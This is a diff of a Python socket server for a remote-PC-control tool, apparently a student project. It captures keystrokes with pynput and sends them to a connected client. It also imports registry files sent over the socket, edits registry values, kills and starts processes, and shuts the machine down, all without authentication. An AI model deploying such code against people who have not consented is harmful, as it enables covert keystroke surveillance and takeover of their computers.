@@ -6,56 +6,22 @@ import time
 from io import BytesIO
 from pynput.keyboard import Key, Listener   
 
-BUFSIZ = 1024
+BUFF_SIZE = 4096 
 
 def sendData(sock, msg):
     sock.sendall(bytes(msg, "utf8"))
 
-def receiveData(sock, msg):
+def recvall(sock):
+    data = b''
     while True:
-        try:
-            msg = sock.recv(BUFSIZ).decode("utf8")
-        except OSError: 
+        while True:
+            part = sock.recv(BUFF_SIZE)
+            data += part
+            if len(part) < BUFF_SIZE:
+                break
+        if data:
             break
-    if (msg == 0):
-        return False
-    return True
-
-def Line(lines):
-    if (len(lines) > 0):
-        res = lines[0]
-        lines.pop(0)
-        res = res.decode()
-        res = res.replace("\n","")
-        return res
-    else:
-        return ""
-
-def receive(sock, lines):
-    buffer = BytesIO()
-    try:
-        resp = sock.recv(100)       
-    except:
-        return              
-    else:
-        buffer.write(resp)          
-        buffer.seek(0)              
-        start_index = 0             
-        for line in buffer:
-            start_index += len(line)
-            lines.append(line)       
-        if start_index:
-            buffer.seek(start_index)
-            remaining = buffer.read()
-            buffer.truncate(0)
-            buffer.seek(0)
-            buffer.write(remaining)
-        else:
-            buffer.seek(0, 2)
-
-def receiveLine(sock, lines):
-    receive(sock, lines)
-    return Line(lines)
+    return data.decode().strip()
 
 def shutdown(sock):
     try:
@@ -152,27 +118,27 @@ def createKey(link):
     except OSError:
         return "0"
 
-def registry(sock, lines):
+def registry(sock):
     s = ""
     fs = open("fileReg.reg", "w")
     fs.close()
     while (True):
-        s = receiveLine(sock, lines)
+        s = recvall(sock)
         if (s == "REG"):
-            data = sock.recv(4096)
+            data = recvall(sock)
             fin = open("fileReg.reg", "w")
             fin.write(data)
             fin.close()
             try:
-                os.system('wmic process call create \'regedit.exe /s fileReg.reg\'')
+                os.system('reg import fileReg.reg')
                 sendData(sock, "1")
             except OSError:
                 sendData(sock, "0")
         elif (s == "SEND"):
-            option = receiveLine(sock, lines)
-            print(option)
-            link = receiveLine(sock, lines)
-            print(link)
+            data = recvall(sock)
+            comp = data.strip().split('\n')
+            option = comp[0]
+            link = comp[1]
             a = baseRegistryKey(link)
             if (a == ""):
                 s = "0"
@@ -182,20 +148,19 @@ def registry(sock, lines):
                 elif (option == "Delete key"):
                     s = deleteKey(link)
                 elif (option == "Get value"):
-                    valueName = receiveLine(sock, lines)
+                    valueName = comp[2]
                     s = getValue(link, valueName)
                 elif (option == "Set value"):
-                    valueName = receiveLine(sock, lines)
-                    value = receiveLine(sock, lines)
-                    typeValue = receiveLine(sock, lines)
+                    valueName = comp[2]
+                    value = comp[3]
+                    typeValue = comp[4]
                     s = setValue(link, valueName, value, typeValue)
                 elif (option == "Delete value"):
-                    valueName = receiveLine(sock, lines)
+                    valueName = comp[2]
                     s = deleteValue(link, valueName)
                 else:
                     s = "0"
             sendData(sock, s)
-            #print(s)
         else:
             return
 
@@ -206,9 +171,9 @@ def printKeys(sock, keys):
         if k == "Key.space":
             k = " "
         if k == "Key.enter":
-            k = "\n"
+            k = "\n "
         if k == "Key.tab":
-            k = "Tab"
+            k = "\t "
         if k == "Key.backspace":
             k = ""
             data = data[0:len(data)-1]
@@ -217,10 +182,12 @@ def printKeys(sock, keys):
         if k == "Key.shift" or k == "Key.esc":
             k = ""
         data += k
+    if (data == ""):
+        data = "0"
     sendData(sock, data)
     #print(data)
 
-def keylog(sock, lines):
+def keylog(sock):
     keys = []
 
     def on_press(key):
@@ -233,8 +200,7 @@ def keylog(sock, lines):
     isHook = False
     listener = Listener()
     while (True):
-        s = receiveLine(sock, lines)
-        data = []
+        s = recvall(sock)
         if (s == "PRINT"):
             printKeys(sock, keys)
             keys.clear()
@@ -243,10 +209,16 @@ def keylog(sock, lines):
                 isHook = True
                 listener = Listener(on_press = on_press, on_release = on_release)
                 listener.start()
+                sendData(sock, "1")
+            else:
+                sendData(sock, "0")
         elif (s == "UNHOOK"):
             if (isHook == True):
                 isHook = False
                 listener.stop()
+                sendData(sock, "1")
+            else:
+                sendData(sock, "0")
         else:
             if (isHook == True):
                 isHook = False
@@ -257,23 +229,29 @@ def keylog(sock, lines):
 def takepic():
     pass
 
-def process(sock, lines):
+def process(sock):
     while (True):
-        s = receiveLine(sock, lines)
+        s = recvall(sock)
+        #print(s)
         if (s == "XEM"):
             process = os.popen('wmic process get Name, ProcessId, ThreadCount').read()
-            sendData(sock, process + '\n')
+            sendData(sock, process)
             #print(process)
         elif (s == "KILL"):
             test = True
             while (test):
-                s = receiveLine(sock, lines)
-                if (s == "KILLID"):
-                    id = receiveLine(sock, lines)
+                s1 = recvall(sock)
+                #print(s1)
+                if (s1 == "KILLID"):
+                    id = recvall(sock)
+                    #print(id)
                     if (id != ""):
                         try:
                             listID = os.popen('wmic process get ProcessId').read()
                             listID = listID.split('\n')
+                            listID = [id for id in listID if (id != '')]
+                            for i in range (0, len(listID)):
+                                listID[i] = listID[i].strip()
                             if (id not in listID):
                                 sendData(sock, "0")
                                 #print("Lỗi\n")
@@ -289,9 +267,9 @@ def process(sock, lines):
         elif (s == "START"):
             test = True
             while (test):
-                s = receiveLine(sock, lines)
+                s = recvall(sock)
                 if (s == "STARTID"):
-                    processName = receiveLine(sock, lines)
+                    processName = recvall(sock)
                     processName += '.exe'
                     processName = "\'" + processName + "\'"
                     try:
@@ -307,9 +285,9 @@ def process(sock, lines):
             break
 
 
-def application(sock, lines):
+def application(sock):
     while (True):
-        s = receiveLine(sock, lines)
+        s = recvall(sock)
         if (s == "XEM"):
             listApp = os.popen('powershell "gps | where {$_.MainWindowTitle } | select name, id, {$_.Threads.Count}').read()
             sendData(sock, listApp + '\n')
@@ -317,13 +295,16 @@ def application(sock, lines):
         elif (s == "KILL"):
             test = True
             while (test):
-                s = receiveLine(sock, lines)
+                s = recvall(sock)
                 if (s == "KILLID"):
-                    id = receiveLine(sock, lines)
+                    id = recvall(sock)
                     if (id != ""):
                         try:
                             listID = os.popen('powershell "gps | where {$_.MainWindowTitle } | select id').read()
                             listID = listID.split('\n')
+                            listID = [id for id in listID if (id != '')]
+                            for i in range (0, len(listID)):
+                                listID[i] = listID[i].strip()
                             if (id not in listID):
                                 sendData(sock, "0")
                                 #print("Lỗi\n")
@@ -339,9 +320,9 @@ def application(sock, lines):
         elif (s == "START"):
             test = True
             while (test):
-                s = receiveLine(sock, lines)
+                s = recvall(sock)
                 if (s == "STARTID"):
-                    appName = receiveLine(sock, lines)
+                    appName = recvall(sock)
                     appName += '.exe'
                     appName = "\'" + appName + "\'"
                     try:
@@ -357,7 +338,7 @@ def application(sock, lines):
             break
 
 hostname = socket.gethostname()
-HOST = socket.gethostbyname(hostname)
+HOST = socket.gethostbyname(hostname) 
 PORT = 65432   
 
 def buttonServer_click():
@@ -366,32 +347,32 @@ def buttonServer_click():
         s.listen()
         conn, addr = s.accept()
         try:
-            print('Connected by', addr)
+            #print('Connected by', addr)
             lines = []
             str = ""
             while True:
                 #time.sleep(1)
-                str = receiveLine(conn, lines)
+                str = recvall(conn)
                 #print(str)
                 if (str == "KEYLOG"):
-                    keylog(conn, lines)
+                    keylog(conn)
                 elif (str == "REGISTRY"):
-                    registry(conn, lines)
+                    registry(conn)
                 elif (str == "SHUTDOWN"):
                     shutdown(conn)
                 elif (str == "TAKEPIC"):
                     takepic()
                 elif (str == "PROCESS"):
-                    process(conn, lines)
+                    process(conn)
                 elif (str == "APPLICATION"):
-                    application(conn, lines)
+                    application(conn)
                 elif (str == "QUIT"):
-                    conn.shutdown(socket.SHUT_RDWR)
+                    conn.close()
                     break
                 else: 
                     continue
         except KeyboardInterrupt:
-            conn.shutdown(socket.SHUT_RDWR)
+            conn.close()
 
 def run_server():
     window = tk.Tk()
